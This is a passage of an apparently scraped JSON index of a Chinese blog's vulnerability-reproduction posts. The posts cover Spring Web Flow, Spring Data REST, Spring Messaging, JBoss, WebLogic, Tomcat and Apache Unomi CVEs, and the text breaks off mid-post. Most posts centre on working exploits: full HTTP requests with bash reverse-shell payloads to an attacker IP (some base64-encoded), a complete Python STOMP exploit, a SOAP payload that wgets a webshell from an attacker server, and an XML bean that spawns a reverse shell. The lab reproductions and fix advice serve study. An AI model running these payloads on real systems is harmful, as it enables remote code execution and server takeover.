是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。\n影响版本Spring Web Flow 2.4.0 – 2.4.4\n漏洞检测根据复现过程，在其指定的请求体后面加上&amp;_(new+java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash+-i+&gt;%26+/dev/tcp/192.168.3.61/2233+0&gt;%261&quot;)).start()=vulhub。\n命令执行不回显，所以漏洞验证需要DNSlog服务器。\n环境搭建使用vulhub的docker环境做复现：\ncd spring/CVE-2017-4971docker-compose up -d\n\n\n查看环境\nhttp://192.168.3.109:8080/\n\n\n复现过程点击左侧Login登录\n\n左侧有密码，随便登录一个账号\n\n直接点击Find Hotels\n\n任意选择一个酒店，点击View Hotel\n\n点击Book Hotel\n\n任意输入后提交\n\n点击Proceed后点击\n\nKali 开启监听\n\nbp开启Intercept，点击Confirm。\n截包后转发到Repeater模块。在其请求体后面加上&amp;_(new+java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash+-i+&gt;%26+/dev/tcp/192.168.3.61/2233+0&gt;%261&quot;)).start()=vulhub\n\nPOST /hotels/booking?execution=e2s2 HTTP/1.1Host: 192.168.3.109:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 169Origin: http://192.168.3.109:8080Connection: closeReferer: http://192.168.3.109:8080/hotels/booking?execution=e2s2Cookie: JSESSIONID=B25BE72E737B2A787DAE1271A4963E84Upgrade-Insecure-Requests: 1_eventId_confirm=&amp;_csrf=52241c68-5963-43ab-a998-da1d8e065434&amp;_(new+java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash+-i+&gt;%26+/dev/tcp/192.168.3.61/2233+0&gt;%261&quot;)).start()=vulhub\n\nPS：这里在点击Confirm之前必须开启bp的截包，如果正常的数据包发出后，就不能执行exp了。\n获得返回到会话\n\n修复建议1、2.4.x用户升级到2.4.52、建议在视图状态中始终使用显式数据绑定声明, 以防止表单提交在不应设置的目标对象上设置字段。\n","categories":["漏洞复现"],"tags":["Spring"]},{"title":"CVE-2017-7504-JBossMQ-JMS-Deserialization","url":"/2022/10/19/CVE-2017-7504-JBossMQ-JMS-Deserialization/","content":"描述​\tJboss AS 4.x及之前版本中,JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞,远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。\n影响版本Jboss AS &#x3D;&lt; 4.x\n环境搭建使用vulhub搭建漏洞环境\n#进入漏洞目录cd vulhub/jboss/CVE-2017-7504#开启环境docker-compose up -d\n\n\n查看环境\nhttp://192.168.2.107:8080/\n\n\n复现过程利用工具下载地址：\nhttps://github.com/joaomatosf/JavaDeserH2HC\n\n通过一下命令可生成一个ser后缀的文件。\njavac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.javajava -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 192.168.2.109:2233\n\n\n\nkali监听2233端口\nnc -lvvp 2233\n\n执行exp\ncurl http://192.168.2.107:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser\n\n\n\n\n修复建议1、升级到JBOSS AS7。\n2、临时解决方案：\n（1）不需要 http-invoker.sar 组件的用户可直接删除此组件。\n（2）添加如下代码至 http-invoker.sar 下 web.xml 的 security-constraint 标签中：&#x2F;*用于对 http invoker 组件进行访问控制。\n","categories":["漏洞复现"],"tags":["JBoss"]},{"title":"CVE-2017-8046-Spring-Data-Rest-RCE","url":"/2022/11/03/CVE-2017-8046-Spring-Data-Rest-RCE/","content":"描述​\tSpring-data-rest服务器在处理PATCH请求时，攻击者可以构造恶意的PATCH请求并发送给spring-date-rest服务器，通过构造好的JSON数据来执行任意Java代码。\n影响版本Spring Data REST versions &lt; 2.5.12, 2.6.7, 3.0 RC3Spring Boot version &lt; 2.0.0 M4Spring Data release trains &lt; Kay-RC3\n漏洞检测发送PATCH请求，将payload前面加上,并转换为bytes类型替换一下数据包中new byte[]&#123;&#125;中&#123;&#125;里的payload。命令执行不回显，所以漏洞验证需要DNSlog服务器。\nPATCH /customers/1 HTTP/1.1Host: 192.168.3.109:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/json-patch+jsonContent-Length: 450[&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,77,117,78,106,69,118,77,106,73,122,77,121,65,119,80,105,89,120,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125&#125;))/lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; &#125;]\n\n环境搭建使用vulhub的docker环境做复现：\ncd spring/CVE-2017-8046docker-compose up -d\n\n\n查看环境\nhttp://192.168.3.109:8080/\n\n\n复现过程反弹shell\nbash -i &gt;&amp; /dev/tcp/192.168.3.61/2233 0&gt;&amp;1\n\nbash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuNjEvMjIzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\n\n使用以下的poc.py文件，将payload前面加上,并转换为bytes类型。\n#!/usr/bin/env pythonpayload = b&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuNjEvMjIzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;byte_c = &#x27;,&#x27;.join(str(i) for i in list(payload))print(byte_c)\n\n\n用python3直接执行，然后输入反弹shell的语句。\n\n通过bp替换new byte[]&#123;&#125;中&#123;&#125;里的payload，kali提前监听，然后send。\n\nPATCH /customers/1 HTTP/1.1Host: 192.168.3.109:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/json-patch+jsonContent-Length: 450[&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,77,117,78,106,69,118,77,106,73,122,77,121,65,119,80,105,89,120,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125&#125;))/lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; &#125;]\n\n\n获得反弹的会话\n\n修复建议1、官方修复方案：https://github.com/spring-projects/spring-data-rest/commit/8f269e28fe8038a6c60f31a1c36cfda04795ab45\nString pathSource = Arrays.stream(path.split(&quot;/&quot;))//        .filter(it -&gt; !it.matches(&quot;\\\\d&quot;)) // no digits        .filter(it -&gt; !it.equals(&quot;-&quot;)) // no &quot;last element&quot;s        .filter(it -&gt; !it.isEmpty()) //        .collect(Collectors.joining(&quot;.&quot;));\n\n解决代码如上，比如it.matches(“\\d”)这一步，不允许存在数字，导致上面的payload失效。\n2、官方已经发布新版本修复了该漏洞，受影响的用户可升级至最新版本来防护该漏洞。\n","categories":["漏洞复现"],"tags":["Spring"]},{"title":"CVE-2018-1270-Spring-Messaging-RCE","url":"/2022/11/04/CVE-2018-1270-Spring-Messaging-RCE/","content":"描述​\tSpring框架中通过spring-messaging模块来实现STOMP（Simple Text-Orientated Messaging Protocol），STOMP是一种封装WebSocket的简单消息协议。攻击者可以通过建立WebSocket连接并发送一条消息造成远程代码执行。如果使用了Spring Security项目中的权限认证，可以在一定程度上增加漏洞利用难度。\n影响版本Spring Framework 5.0 - 5.0.4\nSpring Framework 4.3 - 4.3.14\n漏洞检测通过下述的脚本，完成命令执行的操作。但命令执行不回显，所以漏洞验证需要DNSlog服务器。\n环境搭建使用vulhub的docker环境做复现：\ncd spring/CVE-2018-1270docker-compose up -d\n\n\n查看环境\nhttp://192.168.3.109:8080/\n\n\n复现过程反弹shell\nbash -i &gt;&amp; /dev/tcp/192.168.3.61/2233 0&gt;&amp;1\n\nbash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuNjEvMjIzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\n\n完整exp：\n#!/usr/bin/env python3import requestsimport randomimport stringimport timeimport threadingimport loggingimport sysimport jsonlogging.basicConfig(stream=sys.stdout, level=logging.INFO)def random_str(length):    letters = string.ascii_lowercase + string.digits    return &#x27;&#x27;.join(random.choice(letters) for c in range(length))class SockJS(threading.Thread):    def __init__(self, url, *args, **kwargs):        super().__init__(*args, **kwargs)        self.base = f&#x27;&#123;url&#125;/&#123;random.randint(0, 1000)&#125;/&#123;random_str(8)&#125;&#x27;        self.daemon = True        self.session = requests.session()        self.session.headers = &#123;            &#x27;Referer&#x27;: url,            &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)&#x27;        &#125;        self.t = int(time.time()*1000)    def run(self):        url = f&#x27;&#123;self.base&#125;/htmlfile?c=_jp.vulhub&#x27;        response = self.session.get(url, stream=True)        for line in response.iter_lines():            time.sleep(0.5)        def send(self, command, headers, body=&#x27;&#x27;):        data = [command.upper(), &#x27;\\n&#x27;]        data.append(&#x27;\\n&#x27;.join([f&#x27;&#123;k&#125;:&#123;v&#125;&#x27; for k, v in headers.items()]))                data.append(&#x27;\\n\\n&#x27;)        data.append(body)        data.append(&#x27;\\x00&#x27;)        data = json.dumps([&#x27;&#x27;.join(data)])        response = self.session.post(f&#x27;&#123;self.base&#125;/xhr_send?t=&#123;self.t&#125;&#x27;, data=data)        if response.status_code != 204:            logging.info(f&quot;send &#x27;&#123;command&#125;&#x27; data error.&quot;)        else:            logging.info(f&quot;send &#x27;&#123;command&#125;&#x27; data success.&quot;)    def __del__(self):        self.session.close()sockjs = SockJS(&#x27;http://192.168.3.109:8080/gs-guide-websocket&#x27;)sockjs.start()time.sleep(1)sockjs.send(&#x27;connect&#x27;, &#123;    &#x27;accept-version&#x27;: &#x27;1.1,1.0&#x27;,    &#x27;heart-beat&#x27;: &#x27;10000,10000&#x27;&#125;)sockjs.send(&#x27;subscribe&#x27;, &#123;    &#x27;selector&#x27;: &quot;T(java.lang.Runtime).getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuNjEvMjIzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)&quot;,    &#x27;id&#x27;: &#x27;sub-0&#x27;,    &#x27;destination&#x27;: &#x27;/topic/greetings&#x27;&#125;)data = json.dumps(&#123;&#x27;name&#x27;: &#x27;vulhub&#x27;&#125;)sockjs.send(&#x27;send&#x27;, &#123;    &#x27;content-length&#x27;: len(data),    &#x27;destination&#x27;: &#x27;/app/hello&#x27;&#125;, data)\n\n\n\nKali 开启监听\n\nPython 执行exp\n\n收到会话\n\n修复建议1、在Spring 5.0.5版本中，消息支持模块spring-messaging的DefaultSubscriptionRegistry#findSubscriptionInternal()方法中，SpEL求值的上下文的位置处，使用权限更小的SimpleEvaluationContext来替换原来的StandardEvaluationContext。\n2、官方已经发布新版本修复了该漏洞，受影响的用户可升级至最新版本来防护该漏洞；或查看文档：https://blog.csdn.net/qsort_/article/details/105906256\n","categories":["漏洞复现"],"tags":["Spring"]},{"title":"CVE-2018-2628-WebLogic-Deserialization","url":"/2022/10/26/CVE-2018-2628-WebLogic-Deserialization/","content":"描述​\t远程攻击者可利用该漏洞在未授权的情况下发送攻击数据，通过T3协议（EJB支持远程访问，且支持多种协议。这是Web Container和EJB Container的主要区别）在Weblogic Server中执行反序列化操作，利用RMI（远程方法调用） 机制的缺陷，通过JRMP协议（Java Remote Messaging Protocol：java远程消息交换协议）达到执行任意反序列化payload的目的。\n影响版本Weblogic 10.3.6.0\nWeblogic 12.1.3.0\nWeblogic 12.2.1.2\nWeblogic 12.2.1.3\n漏洞检测通过一下的poc脚本验证是否存在该漏洞。\n下载地址\nhttps://github.com/jas502n/CVE-2018-2628\n\npython2 CVE-2018-2628-poc.py 192.168.3.50 7001\n\n\n\n环境搭建这里使用vulnhub环境来复现该漏洞。\n#进入漏洞目录cd vulhub/weblogic/CVE-2018-2628#开启环境docker-compose up -d\n\n\n查看环境\nhttp://192.168.3.50:7001/\n\n\n复现过程漏洞利用工具下载地址：\nhttps://github.com/jas502n/CVE-2018-2628\n\n使用脚本上传jsp文件。\n\n\n使用另外一个脚本实现交互式。\n\n修复建议1、此漏洞产生于Weblogic T3服务，当开放Weblogic控制台端口（默认为7001端口）时，T3服务会默认开启。关闭T3服务，或控制T3服务的访问权限，能防护该漏洞。对于不在Oracle官方支持范围内的版本，由于没有最新补丁，推荐采用此种方式进行修复。同时，Weblogic采用黑名单的方式进行反序列化漏洞的修复，存在被绕过的风险，因此控制T3服务为防护Weblogic RMI这类反序列化漏洞的有效方式。控制T3服务方式：\n\na）进入Weblogic控制台，在base_domain的配置页面中，进入“安全”选项卡页面，点击“筛选器”，进入连接筛选器配置。 b）在连接筛选器中输入：weblogic.security.net.ConnectionFilterImpl，在连接筛选器规则中输入：127.0.0.1 allow t3 t3s，0.0.0.0&#x2F;0 deny t3 t3s(t3和t3s协议的所有端口只允许本地访问)。 c）保存后需重新启动，规则方可生效。\n\n2、更新Oracle官方发布的最新补丁，同时升级jdk至1.7.0.21以上版本。\n3、如以上两种策略都无法采用，则可以考虑用更改代码的方式。以10.3.6.0为例，在weblogic.utils.io.oif.WebLogicFilterConfig的黑名单DEFAULT_BLACKLIST_CLASS中添加”java.rmi.server.RemoteObjectInvocationHandler”，编译并更新swlclient.jar、wlthint3client.jar这两个用到该类的包\n","categories":["漏洞复现"],"tags":["WebLogic"]},{"title":"CVE-2018-2894-WebLogic-File-Upload","url":"/2022/10/26/CVE-2018-2894-WebLogic-File-Upload/","content":"描述​\tWebLogic管理端未授权的两个页面存在任意上传getshell漏洞，可直接获取权限。两个页面分别为&#x2F;ws_utc&#x2F;begin.do，&#x2F;ws_utc&#x2F;config.do。\n影响版本Oracle WebLogic Server 10.3.6.0\nOracle WebLogic Server 12.1.3.0\nOracle WebLogic Server 12.2.1.2\nOracle WebLogic Server 12.2.1.3\n漏洞检测如果访问以下网址存在，则是存在漏洞。\nhttp://192.168.3.50:7001/ws_utc/config.do\n\n环境搭建这里使用vulnhub环境来复现该漏洞。\n#进入漏洞目录cd vulhub/weblogic/CVE-2018-2894#开启环境docker-compose up -d\n\n\n输入一下地址进入后台登录页面。\nhttp://192.168.3.50:7001/console/login/LoginForm.jsp\n\n\n执行docker-compose logs | grep password查看weblogic的密码。\n\n&#x27;weblogic&#x27; admin password: WbyQous7\n\n\n点击base_domain，点击高级设置，勾选启用web服务测试页。\n\n\n复现过程访问以下url\nhttp://192.168.3.50:7001/ws_utc/config.do\n\n修改Work Home Dir路径\n/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css\n\n将目录设置为ws_utc应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。然后点击保存。\n\n\n点击左侧安全，上传文件。\n\n\n抓到数据包，时间戳为：1666752396181\n\n访问http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]，即可执行webshell。\nhttp://192.168.3.50:7001/ws_utc/css/config/keystore/1666752396181_1.jsp\n\n\n\n\n修复建议1、关闭web服务测试页，或者为&#x2F;ws_utc&#x2F;config.do页面添加访问权限控制。\n2、升级至官方最新版本。\n3、使用Oracle官方通告中的补丁链接：\nhttp://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html\nhttps://support.oracle.com/rs?type=doc&amp;id=2394520.1\n","categories":["漏洞复现"],"tags":["WebLogic"]},{"title":"CVE-2019-0232-Apache-Tomcat-RCE","url":"/2022/10/18/CVE-2019-0232-Apache-Tomcat-RCE/","content":"描述​\t该漏洞是由于Tomcat CGI将命令行参数传递给Windows程序的方式存在错误，使得CGIServlet被命令注入影响。\n​\t该漏洞只影响Windows平台，要求启用了CGIServlet和enableCmdLineArguments参数。但是CGIServlet和enableCmdLineArguments参数默认情况下都不启用。\n影响版本\nApache Tomcat 9.0.0.M1 to 9.0.17\nApache Tomcat 8.5.0 to 8.5.39\nApache Tomcat 7.0.0 to 7.0.93\n\n环境搭建jdk1.8.0_131\nTomcat: 9.0.13\n下载地址：\nhttps://archive.apache.org/dist/tomcat/tomcat-9/v9.0.13/bin/\njre环境变量设置\n​\t在tomcat的bin下面，找到setpath.bat，在其中添加以下内容后运行。\nset JAVA_HOME=C:\\Program Files\\Java\\jdk1.8.0_131\\set JRE_HOME=C:\\Program Files\\Java\\jdk1.8.0_131\\jre\n\n\n\n修改配置文件conf&#x2F;web.xml​\tTomcat的CGI_Servlet组件默认关闭，在 conf&#x2F;web.xml 中找到注释的CGIServlet部分，去掉注释，并配置enableCmdLineArguments和executable。\n  &lt;servlet&gt;      &lt;servlet-name&gt;cgi&lt;/servlet-name&gt;      &lt;servlet-class&gt;org.apache.catalina.servlets.CGIServlet&lt;/servlet-class&gt;      &lt;init-param&gt;        &lt;param-name&gt;cgiPathPrefix&lt;/param-name&gt;        &lt;param-value&gt;WEB-INF/cgi-bin&lt;/param-value&gt;      &lt;/init-param&gt;&lt;init-param&gt;\t&lt;param-name&gt;enableCmdLineArguments&lt;/param-name&gt;\t&lt;param-value&gt;true&lt;/param-value&gt;&lt;/init-param&gt;&lt;init-param&gt;\t&lt;param-name&gt;executable&lt;/param-name&gt;\t&lt;param-value&gt;&lt;/param-value&gt;&lt;/init-param&gt;      &lt;load-on-startup&gt;5&lt;/load-on-startup&gt;  &lt;/servlet&gt;\n\n&lt;servlet-mapping&gt;    &lt;servlet-name&gt;cgi&lt;/servlet-name&gt;    &lt;url-pattern&gt;/cgi-bin/*&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;\n\n\n\nconf&#x2F;contet.xml 给conf/context.xml中的&lt;Context&gt;添加`privileged=true`属性,否则会没有权限。\n\n&lt;Context privileged=&quot;true&quot;&gt;    &lt;!-- Default set of monitored resources. If one of these changes, the    --&gt;    &lt;!-- web application will be reloaded.                                   --&gt;    &lt;WatchedResource&gt;WEB-INF/web.xml&lt;/WatchedResource&gt;    &lt;WatchedResource&gt;WEB-INF/tomcat-web.xml&lt;/WatchedResource&gt;    &lt;WatchedResource&gt;$&#123;catalina.base&#125;/conf/web.xml&lt;/WatchedResource&gt;    &lt;!-- Uncomment this to disable session persistence across Tomcat restarts --&gt;    &lt;!--    &lt;Manager pathname=&quot;&quot; /&gt;    --&gt;&lt;/Context&gt;\n\n\n添加bat文件在webapps\\ROOT\\WEB-INF下面创建cgi-bin文件夹，并在文件夹内创建一个bat文件。\n@echo offecho Context-Type:text/blainecho .set foo=%~1%foo%\n\n\n复现过程http://192.168.3.47:8080/cgi-bin/hello.bat?&amp;C%3A%5CWindows%5CSystem32%5Ccalc.exe\n\n\n修复建议1、禁用enableCmdLineArguments参数。\n2、在conf&#x2F;web.xml中覆写采用更严格的参数合法性检验规则。\n3、升级tomcat到9.0.17以上版本。\n","categories":["漏洞复现"],"tags":["Tomcat"]},{"title":"CVE-2019-2725-Weblogic-Deserialization","url":"/2022/10/27/CVE-2019-2725-Weblogic-Deserialization/","content":"描述​\tCVE-2019-2725是一个Oracle weblogic反序列化远程命令执行漏洞，这个漏洞依旧是根据weblogic的xmldecoder反序列化漏洞，通过针对Oracle官网历年来的补丁构造payload来绕过。\n影响版本weblogic 10.xweblogic 12.1.3\n漏洞检测访问以下目录，若返回状态码200则说明该漏洞。\n/_async/AsyncResponseService/_async/AsyncResponseServiceJms/_async/AsyncResponseServiceHttps/_async/AsyncResponseServiceSoap12/_async/AsyncResponseServiceSoap12Jms/_async/AsyncResponseServiceSoap12Https\n\nhttp://192.168.3.73:7001/_async/AsyncResponseService\n\n\n环境搭建这里使用vulnhub环境中的CVE-2017-10271来复现该漏洞。\n#进入漏洞目录cd vulhub/weblogic/CVE-2017-10271#开启环境docker-compose up -d\n\n\n查看环境\nhttp://192.168.3.50:7001/\n\n\n复现过程kali开启http服务提供下载shell.jsp\n\nbp抓包payload\nPOST /_async/AsyncResponseService HTTP/1.1Host: 192.168.3.73:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateDNT: 1Cookie: vue_admin_template_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjM1MjA5NjEyLCJlbWFpbCI6IiJ9.cTSjCtV8thEmdfyP49gCsHldvX6KAAMjGQ209TCg0K8; JSESSIONID=050455BA3767B12181C6AA3E09AA3064Upgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Length: 857SOAPAction:Accept: */*User-Agent: Apache-HttpClient/4.1.1 (java 1.5)Connection: keep-alivecontent-type: text/xml&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot;xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;&lt;soapenv:Header&gt;&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;&lt;void index=&quot;0&quot;&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;1&quot;&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;2&quot;&gt;&lt;string&gt;wget http://192.168.3.61:8000/shell.jsp -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/shell.jsp&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;\n\n\nsend后，可以看到靶机的get请求。\n\n访问http://192.168.3.73:7001/_async/shell.jsp发现文件已经成功上传。\n通过蚁剑连接。\n\n\n\n修复建议1、及时打上官方CVE-2019-2725补丁包。官方已于4月26日公布紧急补丁包，下载地址：\n2、升级本地JDK版本\n​\t因为Weblogic所采用的是其安装文件中默认1.6版本的JDK文件，属于存在反序列化漏洞的JDK版本，因此升级到JDK7u21以上版本可以避免由于Java原生类反序列化漏洞造成的远程代码执行。\n3、配置URL访问控制策略\n​\t部署于公网的WebLogic服务器，可通过ACL禁止对&#x2F;_async&#x2F;及&#x2F;wls-wsat&#x2F;路径的访问。\n4、删除不安全文件\n​\t删除wls9_async_response.war与wls-wsat.war文件及相关文件夹，并重启Weblogic服务。\n","categories":["漏洞复现"],"tags":["WebLogic"]},{"title":"CVE-2020-13942-Apache-Unomi-RCE","url":"/2022/10/18/CVE-2020-13942-Apache-Unomi-RCE/","content":"描述​\t在Apache Unomi 1.5.1版本之前，攻击者可以通过精心构造的MVEL或ONGl表达式来发送恶意请求，使得Unomi服务器执行任意代码，漏洞对应编号为CVE-2020-11975，而CVE-2020-13942漏洞是对CVE-2020-11975漏洞的补丁绕过，攻击者绕过补丁检测的黑名单，发送恶意请求，在服务器执行任意代码。\n影响版本Apache Unomi &lt; 1.5.2\n环境搭建使用vulhub搭建漏洞环境\n#进入漏洞目录cd vulhub/unomi/CVE-2020-13942#开启环境docker-compose up -d\n\n\n查看环境\nhttp://192.168.2.107:8181/\n\n\n复现过程使用bp抓包，通过POST方法访问网站根目录下的context.json，并携带Payload。\n\n反弹shell命令：\nbash -i &gt;&amp; /dev/tcp/192.168.2.109/3344 0&gt;&amp;1\n\nbase64：\nYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMTA5LzMzNDQgMD4mMQ==\n\n其中发送的payload为：\n&#123; &quot;filters&quot;: [ &#123; &quot;id&quot;: &quot;sample&quot;, &quot;filters&quot;: [ &#123; &quot;condition&quot;: &#123; &quot;parameterValues&quot;: &#123; &quot;&quot;: &quot;script::Runtime r = Runtime.getRuntime(); r.exec(\\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMTA5LzMzNDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\\&quot;);&quot; &#125;, &quot;type&quot;: &quot;profilePropertyCondition&quot; &#125; &#125; ] &#125; ], &quot;sessionId&quot;: &quot;sample&quot; &#125;\n\nkali监听本机的3344端口\n\nbp发送数据包后，kali上获取到shell。\n\n修复建议1、尽可能避免将用户数据放入表达式解释器中。2、目前厂商已发布最新版本，请受影响用户及时下载并更新至最新版本。\n","categories":["漏洞复现"],"tags":["Tomcat"]},{"title":"CVE-2020-14882-Weblogic-RCE","url":"/2022/10/27/CVE-2020-14882-Weblogic-RCE/","content":"描述​\t在Oracle官方发布的2020年10月关键补丁更新公告CPU（Critical Patch Update）中，包含一个存在于Weblogic Console中的高危远程代码执行漏洞CVE-2020-14882。未经身份验证的远程攻击者可能通过构造特殊的 HTTP GET请求，利用该漏洞在受影响的 WebLogic Server 上执行任意代码。\n影响版本WebLogic 10.3.6.0.0\nWebLogic 12.1.3.0.0\nWebLogic 12.2.1.3.0\nWebLogic 12.2.1.4.0\nWebLogic 14.1.1.0.0\n漏洞检测访问以下目录，若返回状态码200则说明该漏洞。\nhttp://192.168.3.74:7001/console/css/%252e%252e%252fconsole.portal\n\n\n环境搭建使用vulnhub环境来复现该漏洞。\n#进入漏洞目录cd vulhub/weblogic/CVE-2020-14882#开启环境docker-compose up -d\n\n\n查看环境\nhttp://192.168.3.74:7001/console/login/LoginForm.jsp\n\n\n复现过程直接访问以下路径即可未授权访问。\nhttp://192.168.3.74:7001/console/css/%252e%252e%252fconsole.portal\n\n还需利用xml反弹shell\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;   xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;   xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;        &lt;constructor-arg&gt;          &lt;list&gt;            &lt;value&gt;bash&lt;/value&gt;            &lt;value&gt;-c&lt;/value&gt;            &lt;value&gt;&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/192.168.3.61/2233 0&gt;&amp;1]]&gt;&lt;/value&gt;          &lt;/list&gt;        &lt;/constructor-arg&gt;    &lt;/bean&gt;&lt;/beans&gt;\n\n\n\n\nkali监听\n\nbp执行payload\n/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://192.168.3.61:8000/exp.xml&quot;)\n\n\n获得反弹过来的会话。\n\n修复建议1、及时下载官方补丁进行升级修复。下载地址如下：https://www.oracle.com/security-alerts/cpuoct2020.html2、关闭后台&#x2F;console&#x2F;console.portal的访问权限。3、修改后台默认地址。进入默认的控制台，例如“localhost&#x2F;console”，进入后点击左侧的 “域名称”-“高级选项”-“保存”，重启服务并清缓存。\n","categories":["漏洞复现"],"tags":["WebLogic"]},{"title":"CVE-2020-1938-Tomcat-LFI","url":"/2022/10/18/CVE-2020-1938-Tomcat-LFI/","content":"描述​\t由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。\n影响版本\nApache Tomcat 6\nApache Tomcat 7 &lt; 7.0.100\nApache Tomcat 8 &lt; 8.5.51\nApache Tomcat 9 &lt; 9.0.31\n\n环境搭建jdk1.8.0_131\nTomcat: 